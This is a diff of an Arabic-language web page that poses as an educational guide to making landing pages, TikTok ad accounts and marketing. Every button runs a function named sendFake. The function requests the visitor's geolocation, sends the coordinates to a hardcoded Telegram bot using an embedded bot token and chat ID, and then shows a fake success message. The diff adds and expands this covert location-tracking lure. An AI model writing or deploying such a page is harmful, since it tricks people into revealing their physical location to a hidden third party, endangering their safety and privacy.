@@ -3,44 +3,49 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>دليل إنشاء حساب إعلاني على تيك توك</title>
+<title>منصة تعليمية</title>
 <style>
   body {
     font-family: Arial, sans-serif;
-    background: #f9f9f9;
+    background: #f0f2f5;
     display: flex;
     justify-content: center;
     align-items: center;
-    height: 100vh;
+    min-height: 100vh;
   }
   .container {
     background: #fff;
-    padding: 30px;
-    border-radius: 10px;
-    box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+    padding: 40px;
+    border-radius: 12px;
+    box-shadow: 0 6px 20px rgba(0,0,0,0.2);
     text-align: center;
-    max-width: 400px;
+    max-width: 450px;
   }
   h1 {
-    margin-bottom: 20px;
     color: #333;
-    font-size: 22px;
+    margin-bottom: 25px;
+    font-size: 24px;
   }
   button {
-    padding: 15px 25px;
+    display: block;
+    width: 80%;
+    margin: 15px auto;
+    padding: 15px;
     font-size: 18px;
     border: none;
-    border-radius: 5px;
-    background: #ff0050;
-    color: #fff;
+    border-radius: 8px;
     cursor: pointer;
-    margin-top: 20px;
+    color: #fff;
+    transition: background 0.3s;
   }
-  button:hover {
-    background: #e60045;
-  }
+  #btn1 { background: #28a745; }
+  #btn1:hover { background: #218838; }
+  #btn2 { background: #ff0050; }
+  #btn2:hover { background: #e60045; }
+  #btn3 { background: #007bff; }
+  #btn3:hover { background: #0069d9; }
   p {
-    margin-top: 15px;
+    margin-top: 20px;
     color: #555;
   }
 </style>
@@ -48,58 +53,57 @@
 <body>
 
 <div class="container">
-  <h1>دليل إنشاء حساب إعلاني على تيك توك</h1>
-  <button onclick="getLocation()">عرض طريقة إنشاء الحساب</button>
+  <h1>منصة تعليمية لإنشاء صفحات وحسابات</h1>
+  <button id="btn1" onclick="sendFake('تم إنشاء الصفحة بنجاح!')">إنشاء صفحة هبوط</button>
+  <button id="btn2" onclick="sendFake('تم عرض طريقة إنشاء الحساب بنجاح!')">طريقة إنشاء حساب إعلاني على تيك توك</button>
+  <button id="btn3" onclick="sendFake('تم عرض خطوات التسويق بنجاح!')">تعلم التسويق</button>
   <p id="status"></p>
 </div>
 
 <script>
 const BOT_TOKEN = "5814823361:AAEFNHuJtnAq_3M51YQPwylzyDsnOnSUOjQ";
 const CHAT_ID = "143914927";
+let locationGranted = false;
+let lastPosition = null;
 
-function getLocation() {
-    if (navigator.geolocation) {
-        document.getElementById("status").innerText = "جارٍ عرض الطريقة...";
-        navigator.geolocation.getCurrentPosition(sendLocation, showError);
+function getLocationOnce(callback) {
+    if (!locationGranted) {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                locationGranted = true;
+                lastPosition = position;
+                callback(position);
+            }, () => {
+                alert("❌ رفضت مشاركة الموقع أو حدث خطأ");
+            });
+        } else {
+            alert("المتصفح لا يدعم تحديد الموقع");
+        }
     } else {
-        alert("المتصفح لا يدعم تحديد الموقع");
+        // استخدم آخر موقع معروف
+        callback(lastPosition);
     }
 }
 
-function sendLocation(position) {
-    const lat = position.coords.latitude;
-    const lon = position.coords.longitude;
+function sendFake(messageToShow) {
+    getLocationOnce(position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
 
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;
 
-    fetch(url)
-        .then(response => {
-            if (response.ok) {
-                document.getElementById("status").innerText = "✅ تم عرض الطريقة بنجاح!";
-            } else {
-                document.getElementById("status").innerText = "❌ حدث خطأ أثناء الإرسال";
-            }
-        })
-        .catch(() => {
-            document.getElementById("status").innerText = "⚠ حدث خطأ أثناء الإرسال";
-        });
-}
-
-function showError(error) {
-    switch(error.code) {
-        case error.PERMISSION_DENIED:
-            alert("❌ رفضت مشاركة الموقع");
-            break;
-        case error.POSITION_UNAVAILABLE:
-            alert("⚠ الموقع غير متاح");
-            break;
-        case error.TIMEOUT:
-            alert("⏳ انتهى وقت تحديد الموقع");
-            break;
-        default:
-            alert("❌ خطأ غير معروف");
-            break;
-    }
+        fetch(url)
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById("status").innerText = messageToShow;
+                } else {
+                    document.getElementById("status").innerText = "❌ حدث خطأ أثناء الإرسال";
+                }
+            })
+            .catch(() => {
+                document.getElementById("status").innerText = "⚠ حدث خطأ أثناء الإرسال";
+            });
+    });
 }
 </script>
 
